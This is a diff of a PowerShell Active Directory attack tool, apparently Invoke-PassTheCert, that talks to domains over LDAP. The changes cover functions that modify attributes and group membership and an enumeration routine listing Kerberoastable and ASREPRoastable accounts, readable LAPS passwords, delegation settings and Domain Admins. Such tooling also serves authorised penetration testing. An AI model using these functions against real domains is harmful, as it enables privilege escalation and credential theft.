-            _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Kobalt KS. STRIKE,CN=Users,DC=X' -Attribute 'description' -Value 'Cat&Ctrl'
+            _RemoveValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Kobalt KS. STRIKE,CN=Users,DC=X' -Attribute 'description' -Value 'Cat&Ctrl'
 
             Removes the value `Cat&Ctrl` of attribute `description` of object `Kobalt KS. STRIKE`, only if the attribute's value was already set to `Cat&Ctrl`. Being a single-valued attribute, then this would leave it empty.
 
         .EXAMPLE
 
-            _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Shelled SE. EMPIRE,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'CIFS/LEGIT'
+            _RemoveValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Shelled SE. EMPIRE,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'CIFS/LEGIT'
 
             Removes the value `CIFS/LEGIT` from the attribute `serviceprincipalname` of object `Shelled SE. EMPIRE`, only if one of the attribute's value(s) was already set to `CIFS/LEGIT`. Being a multi-valued attribute, if `serviceprincipalname` was set to `[CIFS/LEGIT, LDAP/SRV01]`, then this would leave it to `[LDAP/SRV01]`
 
         .EXAMPLE
 
-            _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Met AS. SPLOYT,CN=Users,DC=X' -Attribute 'displayName' -Value 'Sp10ytin'Th3m4LL!'
+            _RemoveValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Met AS. SPLOYT,CN=Users,DC=X' -Attribute 'displayName' -Value 'Sp10ytin'Th3m4LL!'
 
             Removes the value `Sp10ytin'Th3m4LL!` of attribute `displayName` of object `Met AS. SPLOYT`, only if the attribute's value was already set to `Sp10ytin'Th3m4LL!`. Being a single-valued attribute, then this would leave it empty.
 
@@ -9445,7 +9518,7 @@ function _RemoveValueInAttribute {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be removed")]
-        [System.String]$IdentityDN,
+        [System.String]$ObjectDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
         [System.String]$Attribute,
@@ -9456,19 +9529,20 @@ function _RemoveValueInAttribute {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Removing Value '$Value' In Attribute '$IdentityDN':'$Attribute'..."
+    Write-Verbose "[*] Removing Value '$Value' In Attribute '$ObjectDN':'$Attribute'..."
 
     $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $IdentityDN, 
+            $ObjectDN, 
             [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, 
             $Attribute,
             $Value
         ))
     ) |Out-Null
 
-    Write-Host "[+] Successfully Removed Value '$Value' In Attribute '$IdentityDN':'$Attribute' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
+    Write-Host "[+] Successfully Removed Value '$Value' In Attribute '$ObjectDN':'$Attribute' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'AddValueInAttribute' -LdapConnection `$LdapConnection -Object '$ObjectDN' -Attribute '$Attribute' -Value '$Value'"
     return
 }
 
@@ -9489,7 +9563,7 @@ function _ClearAttribute {
             
             The established LDAP Connection Instance.
 
-        .PARAMETER IdentityDN
+        .PARAMETER ObjectDN
 
             [System.String] 
             
@@ -9509,13 +9583,13 @@ function _ClearAttribute {
 
         .EXAMPLE
 
-            _ClearAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'description'
+            _ClearAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'description'
 
             Clears the value stored into the `description` of the object `Ima IA. APPLY`, only if the attribute contained a value.
 
         .EXAMPLE
 
-            _ClearAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'serviceprincipalname'
+            _ClearAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'serviceprincipalname'
 
             Clears the value(s) stored into the `serviceprincipaname` of the object `Ima IA. APPLY`, only if the attribute contained at least one value. For instance, if the attribute was set to `[CIFS/SRV01, LDAP/SRV01, HTTP/SRV01]`, then this would leave it empty.
 
@@ -9540,7 +9614,7 @@ function _ClearAttribute {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be deleted")]
-        [System.String]$IdentityDN,
+        [System.String]$ObjectDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
         [System.String]$Attribute
@@ -9548,7 +9622,7 @@ function _ClearAttribute {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Clearing Attribute '$IdentityDN':'$Attribute'..."
+    Write-Verbose "[*] Clearing Attribute '$ObjectDN':'$Attribute'..."
 
     $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
     $Modification.Name = $Attribute
@@ -9556,13 +9630,13 @@ function _ClearAttribute {
     
     $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $IdentityDN,
+            $ObjectDN,
             $Modification
         ))
     ) |Out-Null
     
-    Write-Host "[+] Successfully Cleared Attribute '$IdentityDN':'$Attribute' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
+    Write-Host "[+] Successfully Cleared Attribute '$ObjectDN':'$Attribute' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
     return
 }
 
@@ -9585,7 +9659,7 @@ function _ShowStatusOfAccount {
 
             [System.String] 
             
-            The identity of the targeted account whose status must be shown.
+            The identity of the principal whose status must be shown.
 
         .EXAMPLE
 
@@ -9670,7 +9744,7 @@ function _EnableAccount {
 
             [System.String] 
             
-            The identity of the targeted account whose status must be enabled.
+            The identity of the principal whose status must be enabled.
 
         .EXAMPLE
 
@@ -9764,7 +9838,7 @@ function _DisableAccount {
 
             [System.String] 
             
-            The identity of the targeted account whose status must be disabled.
+            The identity of the principal whose status must be disabled.
 
         .EXAMPLE
 
@@ -9862,7 +9936,7 @@ function _AddGroupMember {
 
             [System.String] 
             
-            The identity of the object to add into the group's members.
+            The identity of the principal to add into the group's members.
 
         .PARAMETER GroupDN
 
@@ -9919,7 +9993,8 @@ function _AddGroupMember {
     ) |Out-Null
 
     Write-Host "[+] Successfully Added Member '$IdentityDN' To Group '$GroupDN' !"
-    Write-Host "[*] [Remove] Invoke-PassTheCert -Action 'RemoveGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'GroupMembers' -Name '$(_Helper-GetCNFromDN -DN $GroupDN)'"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'RemoveGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
 
     return
 }
@@ -9945,7 +10020,7 @@ function _RemoveGroupMember {
 
             [System.String] 
             
-            The identity of the object to remove from the group's members.
+            The identity of the principal to remove from the group's members.
 
         .PARAMETER GroupDN
 
@@ -10002,7 +10077,8 @@ function _RemoveGroupMember {
     ) |Out-Null
 
     Write-Host "[+] Successfully Removed Member '$IdentityDN' From Group '$GroupDN' !"
-    Write-Host "[*] [Add] Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'GroupMembers' -Name '$(_Helper-GetCNFromDN -DN $GroupDN)'"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
     return
 }
 
@@ -10045,17 +10121,21 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Kerberoasting' -SearchBase 'DC=X' |fl
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'RootDSE'
 
-            Returns all kerberoastable accounts (krbtgt excluded) in the domain `X` (or, if not specified, in the LDAP/S Server's Domain)
-
-            - `|fl` allows to print the multi-valued 'serviceprincipalename' attribute conveniently (no more "...").
+            Returns the `RootDSE` in the LDAP/S Server's Domain (default SearchBase) (in particular: DC Functionality, Forest Functionality, Domain Functionality, Server Name, Schema Naming Context, Configuration Naming Context, dNSHostName, Default Naming Context)
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'ASREPRoasting'
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DCs' -SearchBase 'DC=X'
 
-            Returns all ASREPRoastable accounts (i.e. with UAC Flag DONT_REQ_PREAUTH) in the LDAP/S Server's Domain (default SearchBase)
+            Returns all Domain Controllers in the domain `X` (or, if not specified, in the LDAP/S Server's Domain)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Groups'
+
+            Returns all groups in the LDAP/S Server's Domain (default SearchBase)
 
         .EXAMPLE
 
@@ -10077,15 +10157,21 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Groups'
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'OSs'
 
-            Returns all groups in the LDAP/S Server's Domain (default SearchBase)
+            Returns all Operating Systems of all computers (for which the `operatingSystem`, or `operatingSytemVersion`, attribute is set) in the LDAP/S Server's Domain (default SearchBase)
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DCs'
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'MAQ'
 
-            Returns all Domain Controllers in the LDAP/S Server's Domain (default SearchBase)
+            Returns the Machine Account Quota attribute in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'LAPS'
+
+            Returns all readable LAPS Passwords in the LDAP/S Server's Domain (default SearchBase)
 
         .EXAMPLE
 
@@ -10119,24 +10205,6 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DONT_EXPIRE_PASSWORD'
-
-            Returns all accounts with the `DONT_EXPIRE_PASSWORD` UAC Flag in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'PASSWD_NOTREQD'
-
-            Returns all accounts with the `PASSWD_NOTREQD` UAC Flag in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'admins'
-
-            Returns all accounts with the `(admins=1)` attribute in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'LogonScripts'
 
             Returns all accounts with a LogonScripts attribute in the LDAP/S Server's Domain (default SearchBase)
@@ -10155,12 +10223,6 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DAs'
-
-            Returns all members (recursively) of the group `Domain Admins` in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'gMSAs'
 
             Returns all the Group Managed Service Accounts in the LDAP/S Server's Domain (default SearchBase)
@@ -10173,33 +10235,45 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'LAPS'
-
-            Returns all readable LAPS Passwords in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'MAQ'
-
-            Returns the Machine Account Quota attribute in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'RootDSE'
-
-            Returns the `RootDSE` in the LDAP/S Server's Domain (default SearchBase) (in particular: DC Functionality, Forest Functionality, Domain Functionality, Server Name, Schema Naming Context, Configuration Naming Context, dNSHostName, Default Naming Context)
-
-        .EXAMPLE
-
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'OSs'
-
-            Returns all Operating Systems of all computers (for which the `operatingSystem`, or `operatingSytemVersion`, attribute is set) in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'Trusts'
 
             Returns all Trust Relationships in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'admins'
+
+            Returns all accounts with the `(admins=1)` attribute in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DAs'
+
+            Returns all members (recursively) of the group `Domain Admins` in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DONT_EXPIRE_PASSWORD'
+
+            Returns all accounts with the `DONT_EXPIRE_PASSWORD` UAC Flag in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'PASSWD_NOTREQD'
+
+            Returns all accounts with the `PASSWD_NOTREQD` UAC Flag in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Kerberoasting'
+
+            Returns all kerberoastable accounts (krbtgt excluded)
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'ASREPRoasting'
+
+            Returns all ASREPRoastable accounts (i.e. with UAC Flag DONT_REQ_PREAUTH) in the LDAP/S Server's Domain (default SearchBase)
 
         .EXAMPLE
 
@@ -10221,9 +10295,17 @@ function _LDAPEnum {
 
         .EXAMPLE
 
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'RBCD'
+
+            Returns all Resource-Based Constrained Delegation computers (i.e. granting other principals to act on behalf of any domain user against it) in the LDAP/S Server's Domain (default SearchBase)
+
+        .EXAMPLE
+
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'WritePrincipal'
 
             Returns any Write'ty ACE provided to any non-default user over any object in the LDAP/S Server's Domain (default SearchBase)
+
+            - Might take some time to run.
 
         .EXAMPLE
 
@@ -10241,7 +10323,7 @@ function _LDAPEnum {
 
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'All'
 
-            Return'Em All !!!!!!!!
+            Return'Em All !!!
 
             - Enumerations requiring specific value ARE NOT run. In other words, enumerations like `GroupMembers`, or `OUMembers`, requiring specific parameters, ARE NOT run.
 
@@ -10267,7 +10349,7 @@ function _LDAPEnum {
 
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'Creator' -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X'
 
-            Returns the SID of the creator of the 'John JD. DOE' object in the LDAP/S Server's Domain (default SearchBase).
+            Returns the creator of the 'John JD. DOE' object in the LDAP/S Server's Domain (default SearchBase).
 
             - The `mS-DS-CreatorSID` attribute of an object MAY be populated. If a `null` error is returned, then it means the creator's attribute IS NOT populated.
 
@@ -10320,126 +10402,108 @@ function _LDAPEnum {
 
     switch ($Enum) {
 
-        'Kerberoasting' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*/*)(!(sAMAccountName=krbtgt)))' |Select distinguishedName,sAMAccountName,serviceprincipalname,objectcategory
-        }
-
-        'ASREPRoasting' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' |Select distinguishedName,sAMAccountName,useraccountcontrolnames,objectcategory
-        }
-
-        'Descriptions' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(description=*)' |Select-Object distinguishedName,description
-        }
-
-        'Users' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user))' |Select-Object distinguishedName,sAMAccountName,useraccountcontrolnames,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,objectcategory
-        }
-
-        'Computers' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |Select-Object distinguishedName,sAMAccountName,dnshostname,useraccountcontrolnames,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,operatingsystem,operatingsystemversion,objectcategory
-        }
-
-        'Groups' {
-            # Some objects having NO SID attribute, we silently continue errors.
-            $ErrorActionPreference = 'SilentlyContinue'; 
-
-            #return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(objectCategory=CN=Group,$($RootDSE.schemanamingcontext))" |Select distinguishedname
-            
-            $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=group)' 
-            $Result |?{
-
-                # For some reasons, some SIDs have Definition: byte[] objectsid=System.Byte[]
-                # Some other SIDs have Definition: string objectsid= *, where * is a character. For instance, 'CN=Users,CN=Builtin,DC=X' container has objectSid '!' (?!)
-                # For some other reasons, we may only parse Bytes using '_GetAttributeOfObject'. Hence, we'll filter the objectSid defined as Bytes only.
-                ($_ |Get-Member -Name 'objectSid' -MemberType Properties).Definition -like '*objectsid=System.Byte*' 
-
-            }|%{
-                # Trick to get the S-1... SID (instead of the default bytes). 
-                $_ | Add-Member -Force -NotePropertyName 'objectSid' -NotePropertyValue (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedName -Attribute 'objectSid');
-            }
-
-            return $Result |Select distinguishedname,samaccountname,objectSid,objectcategory
+        'RootDSE' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base |fl
         }
 
         'DCs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' |fl
+        }
+
+        'Groups' {            
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=group)' |Select distinguishedname,samaccountname,objectSid,objectcategory |fl
+        }
+
+        'Descriptions' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(description=*)' |Select-Object distinguishedName,description |fl
+        }
+
+        'Users' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user))' |Select-Object distinguishedName,sAMAccountName,useraccountcontrol,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,objectcategory |fl
+        }
+
+        'Computers' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |Select-Object distinguishedName,sAMAccountName,dnshostname,useraccountcontrol,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,operatingsystem,operatingsystemversion,objectcategory |fl
+        }
+
+        'OSs' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |?{ $_.operatingSystem -ne $null -or $_.operatingSytemVersion -ne $null } |Select distinguishedName,sAMAccountName,operatingSystem,operatingSytemVersion |fl
+        }
+
+        'MAQ' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -Properties 'distinguishedName,ms-DS-MachineAccountQuota' -LDAPFilter '(objectClass=domain)' |fl
+        }
+
+        'LAPS' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))' |fl
         }
 
         'OUs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=organizationalUnit)'  |Select distinguishedName,ou,description,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=organizationalUnit)'  |Select distinguishedName,ou,description,objectcategory |fl
         }
 
         'Sites' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=site)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=site)' |fl
         }
 
         'GPOs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=groupPolicyContainer)' |Select distinguishedname,displayname,gpcfilesyspath,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=groupPolicyContainer)' |Select distinguishedname,displayname,gpcfilesyspath,objectcategory |fl
         }
 
         'GPLinks' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(gPLink=*)(name=*))' |Select distinguishedName,name,gPLink,objectGUID,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(gPLink=*)(name=*))' |Select distinguishedName,name,gPLink,objectGUID,objectcategory |fl
         }
 
         'Printers' {
             return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=printQueue)'
         }
 
-        'DONT_EXPIRE_PASSWORD' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'DONT_EXPIRE_PASSWORD' |Select distinguishedName,name,sAMAccountName,userAccountControlNames,objectcategory
-        }
-
-        'PASSWD_NOTREQD' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'PASSWD_NOTREQD' |Select distinguishedName,name,sAMAccountName,userAccountControlNames,objectcategory
-        }
-
-        'admins' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectClass=person)(admincount=1))' |Select distinguishedName,name,sAMAccountName,userAccountControlNames,objectcategory
-        }
-
         'LogonScripts' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(scriptPath=*)(msTSTnitialProgram=*))' |Select distinguishedName,scriptPath,msTSTnitialProgram,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(scriptPath=*)(msTSTnitialProgram=*))' |Select distinguishedName,scriptPath,msTSTnitialProgram,objectcategory |fl
         }
 
         'CAs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKIEnrollmentService)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKIEnrollmentService)' |fl
         }
 
         'CertificateTemplates' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)' |fl
+        }
+
+        'gMSAs' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)' |fl
+        }
+
+        'sMSAs' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)' |fl
+        }
+
+        'Trusts' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=trustedDomain)' |fl
+        }
+
+        'admins' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectClass=person)(admincount=1))' |Select distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory |fl
         }
 
         'DAs' {
             return _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name 'Domain Admins' |fl
         }
 
-        'gMSAs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'
+        'DONT_EXPIRE_PASSWORD' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'DONT_EXPIRE_PASSWORD' |Select distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory |fl
         }
 
-        'sMSAs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)'
+        'PASSWD_NOTREQD' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'PASSWD_NOTREQD' |Select distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory |fl
         }
 
-        'LAPS' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))'
+        'Kerberoasting' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*/*)(!(sAMAccountName=krbtgt)))' |Select distinguishedName,sAMAccountName,serviceprincipalname,objectcategory |fl
         }
 
-        'MAQ' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -Properties ms-DS-MachineAccountQuota -LDAPFilter '(objectClass=domain)'
-        }
-
-        'RootDSE' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base
-        }
-
-        'OSs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |?{ $_.operatingSystem -ne $null -or $_.operatingSytemVersion -ne $null } |Select distinguishedName,sAMAccountName,operatingSystem,operatingSytemVersion
-        }
-
-        'Trusts' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=trustedDomain)'
+        'ASREPRoasting' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' |Select distinguishedName,sAMAccountName,useraccountcontrol,objectcategory |fl
         }
 
         'ShadowCreds' {
@@ -10485,7 +10549,6 @@ function _LDAPEnum {
 
                     if ($KeyCredential.Version -eq 0) {
                         $padding = (4 - ($length % 4)) % 4
-                        #if ($padding -gt 0) { $reader.ReadBytes($padding) | Out-Null }
                         $reader.ReadBytes($padding) | Out-Null
                     }
                     
@@ -10513,16 +10576,19 @@ function _LDAPEnum {
         }
 
         'Unconstrained' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' |Select distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory |fl
         }
 
         'Constrained' {
